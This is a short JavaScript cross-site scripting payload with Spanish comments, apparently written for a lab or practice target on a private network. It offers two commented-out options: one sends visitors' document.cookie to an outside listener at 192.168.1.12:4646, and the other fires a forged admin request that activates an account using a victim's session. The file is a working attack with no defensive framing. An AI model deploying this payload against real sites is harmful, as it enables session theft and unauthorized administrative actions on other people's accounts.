var request = new XMLHttpRequest();

// elegir una opcion de las dos según necesidad

// 1 opcion = capturar cookies de usuarios activos
//request.open('GET', 'http://192.168.1.12:4646/?cookie=' + document.cookie);

// 2 opcion = CSRF; realizar peticiones desde otro usuario aprovechando que teniamos su cookie
//request.open('GET', 'http://192.168.1.22/admin/admin.php?id=11&status=active');

request.send();

